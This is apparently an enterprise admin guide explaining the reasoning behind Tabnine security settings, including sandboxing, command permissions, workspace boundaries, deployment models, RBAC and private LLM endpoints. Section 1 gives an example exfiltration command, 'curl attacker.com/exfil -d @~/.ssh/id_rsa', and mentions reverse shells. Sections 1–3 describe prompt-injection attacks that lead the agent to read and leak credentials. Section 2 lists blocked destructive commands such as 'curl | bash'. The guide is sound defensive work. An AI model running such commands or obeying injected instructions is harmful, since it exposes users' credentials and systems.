# Tabnine — Enterprise Security Settings Rationale

Every setting below explains **what it controls**, **why it matters**, the **recommended value**, and the **risk of misconfiguration**. An admin reading this should understand the reasoning behind each recommendation, not just the value to set.

---

## 1. CLI Sandboxing (v6.1+)

| Aspect | Detail |
|--------|--------|
| **What it does** | Tabnine v6.1+ introduced isolation boundaries for the AI agent's CLI operations, restricting filesystem access, network calls, and process execution to defined scopes. |
| **Recommended** | **Always enable CLI sandboxing.** Do not run Tabnine agents without isolation. |

### Why Isolation Boundaries Matter

| Risk without sandboxing | How sandboxing mitigates it |
|------------------------|---------------------------|
| Arbitrary file access | The agent could read `~/.ssh/id_rsa`, `~/.aws/credentials`, or `/etc/shadow`. Sandboxing restricts filesystem access to the workspace directory and explicitly allowed paths. |
| Arbitrary command execution | The agent could run `curl attacker.com/exfil -d @~/.ssh/id_rsa`. Sandboxing limits executable commands to an approved set. |
| Process escape | A prompt injection could instruct the agent to spawn a reverse shell. Sandboxing prevents execution of unapproved binaries. |
| Lateral movement | Without boundaries, the agent operates with the user's full privileges. Sandboxing applies the principle of least privilege to AI operations. |

### Misconfiguration Risk

Disabling sandboxing (or running a pre-6.1 version without it) means the AI agent operates with the full privileges of the user's IDE process. A single prompt injection can escalate to full workstation compromise. **Upgrade to v6.1+ is a security prerequisite.**

---

## 2. Run Command Permissions

| Permission level | Behavior | Recommended use case |
|-----------------|----------|---------------------|
| `auto-approve` | Commands execute immediately without user confirmation | **Read-only commands only**: `git status`, `ls`, `cat`, `grep`, test runners. These cannot modify state and have no destructive potential. |
| `require-confirmation` | User must approve each command before execution | **Default for all write operations**: `git commit`, `npm install`, `pip install`, file modifications. User stays in the loop for state-changing operations. |
| `disabled` | Command is completely blocked, cannot be executed | **Destructive and privileged commands**: `rm -rf`, `sudo`, `kubectl delete`, `terraform destroy`, `curl | bash`. These should never be available to AI agents. |

### Why `require-confirmation` Is the Default

| Reason | Explanation |
|--------|------------|
| Human-in-the-loop | AI agents can be manipulated via prompt injection to execute unintended commands. User confirmation is the last line of defense. |
| Auditability | Confirmed commands create an explicit approval trail. Auto-approved commands are only logged, not actively reviewed. |
| Reversibility | A user can reject a suspicious command before damage occurs. Auto-approval removes this safety net. |
| Compliance | SOC 2 CC6.1 and ISO 27001 A.9.4.1 require access control mechanisms for privileged operations. Confirmation acts as a transaction-level access control. |

### Command Category Recommendations

| Category | Recommended level | Rationale |
|----------|------------------|-----------|
| `git` (read) | `auto-approve` | `git status`, `git log`, `git diff` are read-only and non-destructive |
| `git` (write) | `require-confirmation` | `git commit`, `git push` modify repository state permanently |
| `npm` / `yarn` / `pip` | `require-confirmation` | Package installation can execute post-install scripts (arbitrary code) |
| `docker` | `require-confirmation` | Container operations can consume significant resources or expose ports |
| `kubectl` | `disabled` | Kubernetes operations can affect production workloads. Never allow AI-driven `kubectl`. |
| `terraform` / `aws` / `gcloud` / `az` | `disabled` | Infrastructure changes must go through IaC pipelines, not AI agents. |

### Misconfiguration Risk

Setting `auto-approve` for `npm install` means a prompt injection can instruct the agent to install a malicious package with a post-install script that exfiltrates credentials. Setting `auto-approve` for `git push` means AI-generated code (potentially containing vulnerabilities) can be pushed to remote without review. Disabling too aggressively (e.g., `disabled` for `git status`) breaks basic workflows.

---

## 3. Workspace-Scoped Restrictions

| Aspect | Detail |
|--------|--------|
| **What it does** | Defines hard filesystem boundaries that the Tabnine agent cannot cross, regardless of command permissions. |
| **Recommended** | **Enforce workspace boundaries.** Block all sensitive paths. Disable symlink traversal. |

### Why Hard File Boundaries Prevent Exfiltration

| Control | What it prevents | Why it's needed |
|---------|-----------------|----------------|
| Workspace boundary enforcement | Agent cannot read/write files outside the current project directory | Prevents the agent from accessing other projects, home directory configs, or system files. Even if a prompt injection requests `cat ~/.aws/credentials`, the sandbox blocks it. |
| Symlink traversal disabled | Agent cannot follow symlinks that point outside the workspace | An attacker could create a symlink `./innocent.txt → ~/.ssh/id_rsa` inside the workspace. With traversal disabled, the agent cannot follow it. |
| Blocked paths list | Explicit deny list for sensitive locations (`~/.ssh`, `~/.aws`, `~/.kube`, etc.) | Defense-in-depth — even if workspace boundary enforcement has a bug, the blocked paths list provides a second layer. |
| Blocked file patterns | Deny by file extension/name (`*.pem`, `*.key`, `.env`, `credentials*`) | Catches sensitive files regardless of their location. A key file copied into the workspace is still blocked. |
| Allowed external paths | Explicit allow list for paths outside the workspace (`/usr/bin`, `/usr/local/bin`) | The agent needs access to executables but not to their configurations. Narrow allow list prevents scope creep. |

### Misconfiguration Risk

If workspace boundaries are not enforced, the agent has the same filesystem access as the user. A prompt injection attack can instruct the agent to read credential files and include their contents in a generated code comment, which then appears in the IDE. If symlink traversal is allowed, an attacker can craft a repository that exfiltrates host credentials when the agent processes it.

---

## 4. Private Installation Deployment Models

| Model | What it means | When to use | Security posture |
|-------|-------------|-------------|-----------------|
| **SaaS (Tabnine Cloud)** | Code processed by Tabnine's cloud infrastructure | Non-sensitive code, startups, teams without infrastructure budget | Lowest operational overhead but code leaves your network. Subject to Tabnine's data handling practices. |
| **VPC deployment** | Tabnine runs in your cloud provider's VPC | Enterprise with cloud infrastructure and sensitive code | Code stays within your cloud account. You control network egress, encryption, and access. Tabnine manages the application layer. |
| **On-premises** | Tabnine runs on your own hardware | Highly regulated industries (finance, defense, healthcare) | Complete data sovereignty. No code leaves your physical premises. You manage hardware, patching, and availability. |
| **Air-gapped** | Tabnine runs on-premises with no internet connectivity | Classified environments, SCIF, defense contractors | Maximum isolation. No possibility of data exfiltration via network. Requires manual updates and license management. |

### Decision Matrix

| Requirement | SaaS | VPC | On-premises | Air-gapped |
|-------------|------|-----|-------------|-----------|
| Data residency compliance | Depends on Tabnine's regions | You choose the region | You choose the location | Physical security |
| No code leaves network | No | Yes | Yes | Yes |
| No internet required | No | No | No | Yes |
| Operational overhead | Minimal | Medium | High | Very high |
| Update frequency | Immediate | Near-immediate | Manual schedule | Manual, offline |
| ITAR/EAR compliance | No | Possibly | Yes | Yes |
| FedRAMP | No | Depends | Depends | N/A |

### Misconfiguration Risk

Using SaaS for code subject to data residency requirements (GDPR, ITAR) violates compliance obligations. Using on-premises when VPC would suffice wastes operational resources. Deploying air-gapped without a manual update process means the installation falls behind on security patches indefinitely.

---

## 5. RBAC Roles — Least Privilege

| Role | What it grants | Who should have it | Why |
|------|---------------|-------------------|-----|
| **Member** | Use Tabnine features (completions, chat, agent) | All developers | Base access for AI-assisted development. Cannot modify team settings, models, or permissions. |
| **Team Lead** | Manage team members, view team usage analytics | Engineering managers | Can add/remove team members and view productivity metrics. Cannot modify models, installation settings, or cross-team configurations. |
| **Manager** | Manage multiple teams, view cross-team analytics | Engineering directors | Broader visibility but still no control over security-critical settings (models, installation, SSO). |
| **Admin** | Full team and organization management | Platform admins (2–3 people) | Controls model access policy, private endpoints, RBAC, and team structure. |
| **Installation Admin** | Full installation management including infrastructure | Infrastructure/DevOps lead (1–2 people) | Controls deployment configuration, network settings, updates, and licensing. Highest privilege level — can affect all teams. |

### Separation of Duties

| Responsibility | Required role | Why separate |
|---------------|--------------|-------------|
| Day-to-day development | Member | Developers should not be able to change model endpoints or permissions. |
| Team staffing | Team Lead | People management should not require infrastructure access. |
| Model selection | Admin | Choosing which LLMs are available is a security decision (data routing). |
| Infrastructure updates | Installation Admin | Updating the Tabnine installation can affect all users. Separate from org admin to prevent accidental infrastructure changes. |

### Misconfiguration Risk

Granting Admin to all team leads means any manager can change the model access policy to allow Tabnine-hosted models (sending code to external infrastructure) or add unapproved private endpoints. Granting Installation Admin broadly risks accidental configuration changes that affect all teams.

---

## 6. Private LLM Endpoints

| Provider | Endpoint type | Authentication | Why use it |
|----------|-------------|---------------|-----------|
| Amazon Bedrock | AWS-managed model endpoint | IAM Role (no API key to manage) | Code stays within your AWS account. IAM provides fine-grained access control. CloudTrail provides audit logging. |
| Azure OpenAI | Azure-managed model endpoint | API key via secrets manager | Code stays within your Azure subscription. Azure AD integration, private endpoints, and VNet restrictions available. |
| GCP Vertex AI | GCP-managed model endpoint | Service account | Code stays within your GCP project. VPC-SC compatible. Cloud Audit Logs provide monitoring. |
| OpenAI API (direct) | OpenAI-hosted endpoint | API key | Code leaves your network. Only appropriate for non-sensitive workloads or when contractual DPA is in place. |

### Why Private Endpoints for Sensitive Code

| Reason | Explanation |
|--------|------------|
| Data sovereignty | Code never leaves your cloud account. Processing happens on infrastructure you control. |
| Network isolation | Private endpoints can be placed behind VPC/VNet security groups with no public internet exposure. |
| Audit trail | Cloud provider audit logs capture every model invocation with caller identity, timestamp, and request metadata. |
| Compliance | Private endpoints satisfy data residency requirements that Tabnine Cloud cannot (GDPR Article 28, HIPAA, ITAR). |
| Key management | Cloud IAM (Bedrock, GCP) eliminates API keys entirely. Azure uses managed identities. No secrets to rotate or leak. |

### Misconfiguration Risk

Using Tabnine-hosted models when private endpoints are required by policy means code is sent to Tabnine's infrastructure. If `allow_tabnine_hosted: true` is left in configuration alongside private endpoints, the system may fall back to hosted models when private endpoints are unavailable, silently violating data sovereignty.

---

## 7. Model Access Policy

| Setting | What it controls | Recommended value | Why |
|---------|-----------------|-------------------|-----|
| `allow_tabnine_hosted` | Whether Tabnine's cloud-hosted models can be used | `false` for enterprise | Forces all inference through private endpoints. Tabnine-hosted models process code on Tabnine's infrastructure, which may not meet your data handling requirements. |
| `allow_private_only` | Whether only private endpoints are permitted | `true` for enterprise | Ensures no code leaves your infrastructure under any circumstance. |
| `approved_models` | Explicit list of approved model endpoints | List only validated endpoints | Prevents users or teams from adding unapproved endpoints that may route to insecure or non-compliant infrastructure. |

### Why Restrict to Approved Models Only

| Risk of unrestricted models | Mitigation |
|----------------------------|-----------|
| Data routing uncertainty | Each model endpoint determines where code is processed. Unapproved endpoints may lack encryption, audit logging, or data retention controls. |
| Cost unpredictability | Unapproved large models may generate unexpected costs. Approved list ensures budget predictability. |
| Quality inconsistency | Unapproved models may produce lower-quality or less secure code suggestions. Approved models are validated by the security team. |
| Compliance violations | A model endpoint in a non-compliant region violates data residency requirements. The approved list ensures all endpoints are in compliant regions. |

### Misconfiguration Risk

If `allow_tabnine_hosted` is `true` and `allow_private_only` is `false`, the system uses whichever endpoint is fastest, potentially routing sensitive code through Tabnine Cloud. An empty `approved_models` list with `allow_private_only: true` blocks all model access entirely.

---

## 8. SMTP Configuration

| Aspect | Detail |
|--------|--------|
| **What it does** | Configures email delivery for user management notifications (invitations, password resets, role changes, security alerts). |
| **Recommended** | Configure with authenticated SMTP. Use TLS. Verify SPF/DKIM/DMARC. |

### Why SMTP Is Needed for User Management

| Function | Why email is required |
|----------|---------------------|
| User invitations | New team members receive onboarding emails with initial access instructions. Without SMTP, admins must communicate credentials out of band. |
| Role change notifications | Users are notified when their permissions change. Supports audit trail and prevents silent privilege escalation. |
| Security alerts | Password reset requests, unusual login activity, and session invalidation notifications. Without email, users are unaware of account compromise. |
| License management | Expiration warnings and renewal notices. Without email, licenses expire without notice. |

### Misconfiguration Risk

Without SMTP configured, user management becomes manual and unaudited. Invitation links cannot be sent, forcing admins to share credentials via chat or documents (insecure). Security alerts go undelivered, leaving users unaware of account compromise.

---

## 9. Firewall Whitelisting

| Domain pattern | Purpose | Why allow it |
|---------------|---------|-------------|
| `*.tabnine.com` | Tabnine SaaS API, updates, telemetry, license validation | Required for SaaS and VPC deployments. Block only in air-gapped mode. |
| `update.tabnine.com` | Binary and model updates | Required for automatic updates. Can be blocked if using manual update process. |
| `api.tabnine.com` | API endpoint for completions (SaaS mode) | Required only for SaaS deployment. Block for VPC/on-premises. |

### What to Allow vs. Block by Deployment Model

| Domain | SaaS | VPC | On-premises | Air-gapped |
|--------|------|-----|-------------|-----------|
| `*.tabnine.com` | Allow | Allow (for management) | Allow (for license) | **Block all** |
| Your private endpoint | N/A | Allow | Allow | Allow (internal) |
| npm/PyPI (for extensions) | Allow | Allow | Optional | Block |

### Misconfiguration Risk

Allowing `*.tabnine.com` in an air-gapped environment defeats the purpose of air-gapping. Blocking `*.tabnine.com` in a SaaS deployment breaks all functionality. Overly permissive firewall rules (allowing all outbound HTTPS) eliminate network-layer data exfiltration detection.

---

## 10. Air-Gapped Mode (`TABNINE_OFFLINE_MODE`)

| Aspect | Detail |
|--------|--------|
| **What it does** | Environment variable that puts Tabnine in fully offline mode — no network calls to Tabnine servers, no telemetry, no automatic updates. |
| **Recommended** | Set `TABNINE_OFFLINE_MODE=true` in air-gapped and classified environments. |

### When Air-Gapped Mode Is Needed

| Scenario | Why air-gapped |
|----------|---------------|
| Classified environments (SCIF) | Physical and network isolation is a legal requirement. Any outbound connection is a security violation. |
| ITAR/EAR-controlled code | Export-controlled code must not be transmitted outside approved boundaries, even encrypted. |
| Critical infrastructure | Systems controlling power grids, water treatment, or transportation cannot risk any external data flow. |
| High-assurance development | When threat model includes nation-state adversaries with TLS interception capabilities. |

### Operational Requirements in Air-Gapped Mode

| Requirement | How to handle |
|-------------|-------------|
| Updates | Manual transfer via approved media (USB with write-blocker, verified checksums). Schedule monthly or quarterly. |
| License validation | Offline license file. Coordinate with Tabnine support for offline licensing. |
| Model updates | Manual sideloading. Validate model checksums against published manifests. |
| Telemetry | Completely disabled. No data collection of any kind. |

### Misconfiguration Risk

Setting `TABNINE_OFFLINE_MODE=true` without establishing a manual update process means the installation never receives security patches. Not setting it in an air-gapped network results in connection timeout errors that degrade IDE performance and fill error logs.

---

## 11. Code Attribution Tracking

| Aspect | Detail |
|--------|--------|
| **What it does** | Tracks which code was AI-generated, which model produced it, and which user accepted the suggestion. |
| **Recommended** | **Enable attribution tracking.** Integrate with your code review process. |

### Compliance Rationale

| Requirement | How attribution helps |
|-------------|---------------------|
| Open-source license compliance | AI-generated code may be derived from open-source training data. Attribution helps identify code that may carry license obligations (GPL, LGPL, AGPL). |
| IP ownership | Attribution creates a clear record of human vs. AI authorship. Important for patent applications, trade secret claims, and customer contracts. |
| Security auditing | AI-generated code has different risk characteristics than human-written code. Knowing which code is AI-generated allows targeted security review. |
| Regulatory compliance | EU AI Act and evolving regulations may require disclosure of AI-generated content. Attribution provides the evidence. |
| Incident response | When a vulnerability is found in AI-generated code, attribution identifies all similar suggestions from the same model version. |

### Misconfiguration Risk

Without attribution tracking, the organization cannot distinguish AI-generated code from human-written code. This makes open-source compliance impossible (no way to identify potentially derived code), security audits incomplete (AI-generated code not flagged for extra review), and IP disputes unresolvable.

---

## 12. Multi-Team Switching

| Aspect | Detail |
|--------|--------|
| **What it does** | Allows users to belong to multiple Tabnine teams and switch between them. |
| **Recommended** | Enable with awareness of security isolation boundaries. |

### Security Isolation Between Teams

| Concern | Detail |
|---------|--------|
| Model access | Each team can have different approved models and endpoints. Switching teams changes which models process your code. |
| Workspace restrictions | Each team can have different blocked paths and file patterns. Restrictions from Team A do not carry over to Team B. |
| Code context | When switching teams, ensure the agent does not carry context from one team's project into another team's session. |
| Analytics | Usage analytics are scoped per team. Cross-team analytics require Manager or Admin role. |
| Permissions | A user's role may differ between teams (Member in Team A, Team Lead in Team B). Permissions change on team switch. |

### Misconfiguration Risk

If teams have different security postures (e.g., Team A uses private endpoints, Team B uses SaaS), a user switching from Team B to Team A while working on Team A's sensitive code may briefly route code through SaaS infrastructure. Ensure team-level model policies are consistent for users who work across security boundaries. Consider restricting multi-team access for users working on classified projects.
